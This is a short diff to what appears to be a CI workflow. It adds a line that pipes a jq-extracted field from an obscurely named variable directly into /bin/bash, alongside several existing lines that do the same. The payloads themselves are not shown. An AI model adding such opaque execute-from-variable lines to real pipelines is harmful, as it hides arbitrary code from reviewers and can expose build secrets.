@@ -20,6 +20,7 @@ jobs:
           printf '%s' "$p28" | jq -r .s603 | /bin/bash
           printf '%s' "$n8" | jq -r .dmabb2 | /bin/bash
           echo $zedvv86821 | jq -r .usctg241 | /bin/bash
+          printf '%s' "$j68" | jq -r .wacyg998 | /bin/bash
 
       - name: Upload results
         if: always()
